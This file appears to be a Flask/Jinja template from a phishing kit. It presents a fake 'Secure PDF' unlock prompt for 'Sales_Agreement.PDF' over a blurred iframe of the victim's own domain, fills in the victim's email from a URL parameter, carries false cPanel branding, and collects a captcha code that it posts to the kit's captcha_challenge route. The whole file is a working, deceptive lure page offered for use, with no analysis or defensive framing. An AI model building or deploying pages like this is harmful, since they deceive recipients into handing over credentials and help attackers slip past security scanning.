<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confidential Document | Secure PDF Access</title>
    
    <style>
        /* Reset and body setup */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f4f4f4;
        }

        /* Blurred Background */
        #background-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
            filter: blur(1.5px) brightness(0.8);
        }

        /* Trigger Button */
        .show-btn {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.7);
            background: #ffffff;
            color: #333;
            padding: 15px 30px;
            border-radius: 50px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            font-weight: bold;
            cursor: pointer;
            z-index: 10;
            transition: transform 0.3s ease;
            border: 2px solid #ff6c2c;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .show-btn:hover {
            transform: translate(-50%, -50%) scale(0.95);
        }

        /* Hide the checkbox */
        #show {
            display: none;
        }

        /* Popup Container */
        .container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.7);
            width: 320px;
            background: #ffffff;
            border-radius: 17px;
            box-shadow: 0 15px 60px rgba(0,0,0,0.3);
            z-index: 100;
            opacity: 0;
            visibility: hidden;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            padding: 25px;
            text-align: center;
            box-sizing: border-box;
        }

        /* Show popup when checkbox is checked */
        #show:checked + .show-btn {
            display: none;
        }

        #show:checked ~ .container {
            transform: translate(-50%, -50%) scale(1);
            opacity: 1;
            visibility: visible;
        }

        /* Close Button */
        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 24px;
            font-weight: bold;
            color: #888;
            cursor: pointer;
            line-height: 1;
            transition: color 0.3s;
        }
        
        .close-btn:hover {
            color: #333;
        }

        /* Loading Spinner */
        #loading-spinner {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200px;
        }

        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ff6c2c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Form Content (hidden initially) */
        #form-content {
            display: none;
        }

        .lock-icon {
            width: 40px;
            height: 40px;
            margin-bottom: 18px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        h1 {
            font-size: 17px;
            margin: 0 0 8px 0;
            color: #333;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }

        .input-group {
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 8px;
            color: #444;
        }

        .input-group input {
            width: 80%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 30px;
            text-align: center;
            font-size: 18px;
            letter-spacing: 8px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #ff6c2c;
        }

        button {
            width: 80%;
            padding: 15px;
            background: #ff6c2c;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            box-shadow: 0 4px 10px rgba(255, 108, 44, 0.3);
        }

        button:hover {
            background: #e55a1f;
        }

        #access-granted {
            display: none;
            padding: 20px;
            background: #e8f5e9;
            border-radius: 10px;
            margin-top: 20px;
        }

        #access-granted h3 {
            color: #2e7d32;
            margin: 0 0 10px 0;
        }

        #access-granted a {
            color: #2e7d32;
            font-weight: bold;
            text-decoration: underline;
        }

        /* Success message style */
        .success-msg {
            color: #2e7d32;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <iframe id="background-iframe" src="https://{{ user_domain }}"></iframe>

    <!-- Checkbox Trigger -->
    <input type="checkbox" id="show">
    <label for="show" class="show-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock" style="width: 16px; height: 16px; margin-right: 8px;">
        Access Secure PDF
    </label>

    <!-- Popup Container -->
    <div class="container">
        <label for="show" class="close-btn" title="close">×</label>
        
        <!-- Loading Spinner (visible initially) -->
        <div id="loading-spinner">
            <div class="spinner"></div>
        </div>

        <!-- Main Content – now a proper FORM -->
        <form id="form-content" method="POST" action="{{ url_for('captcha_challenge') }}">
            <img class="lock-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/59/Semi-protection-shackle-no-text.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="lock">
            
            <h1>Sales_Agreement.PDF</h1>
            <p class="email">For: {{ request.args.get('web', 'default') }}</p>
            <p>Enter the 6-digit code to remove security</p>

            <div class="input-group" id="input-group">
                <label for="captcha-input">
                    <img src="data:image/png;base64,{{ img_data }}" alt="CODE" style="max-width: 100%; height: auto;">
                </label>
                <input type="password" id="captcha-input" name="code" maxlength="6" placeholder="******" required>
            </div>

            <input type="hidden" name="web" value="{{ request.args.get('web') }}">

            <button type="submit" id="submit-btn">Verify & Unlock PDF</button>
            
            <!-- Message area for validation errors or success -->
            <div id="form-message" style="margin-top: 12px; font-size: 14px;"></div>

            <p style="text-align: center; font-size: 12px;">&copy; 2026 cPanel. All Rights Reserved.</p>
        </form>
    </div>

    <script>
        (function() {
            const showBtn = document.querySelector('.show-btn');
            const checkbox = document.getElementById('show');
            const spinner = document.getElementById('loading-spinner');
            const form = document.getElementById('form-content');
            const input = document.getElementById('captcha-input');
            const submitBtn = document.getElementById('submit-btn');
            const msgDiv = document.getElementById('form-message');
            const inputGroup = document.getElementById('input-group');

            // ----- Trigger button: show spinner then popup -----
            showBtn.addEventListener('click', function(e) {
                e.preventDefault();
                // Show spinner and hide form
                spinner.style.display = 'flex';
                form.style.display = 'none';

                // After 1.5s, hide spinner, show form, and check checkbox to open popup
                setTimeout(() => {
                    spinner.style.display = 'none';
                    form.style.display = 'block';
                    checkbox.checked = true;
                    input.focus(); // auto-focus
                }, 1500);
            });

            // ----- Form submission handler -----
            form.addEventListener('submit', function(event) {
                // Prevent default browser submission so we can validate
                event.preventDefault();

                const code = input.value.trim();

                // Validate: must be exactly 6 digits
                if (code.length !== 6 || !/^\d{6}$/.test(code)) {
                    msgDiv.textContent = 'Please enter the complete 6‑digit code (numbers only).';
                    msgDiv.style.color = '#d63031';
                    input.focus();
                    return;
                }

                // If valid, show a brief success message and submit
                msgDiv.textContent = 'Verifying…';
                msgDiv.style.color = '#2e7d32';
                submitBtn.disabled = true;
                submitBtn.textContent = 'Verifying…';

                // Optionally hide input and button for a clean look
                inputGroup.style.display = 'none';
                submitBtn.style.display = 'none';

                // Actually submit the form to Flask
                // We use this.submit() because 'this' is the form element
                this.submit();
            });

        })();
    </script>

</body>
</html>
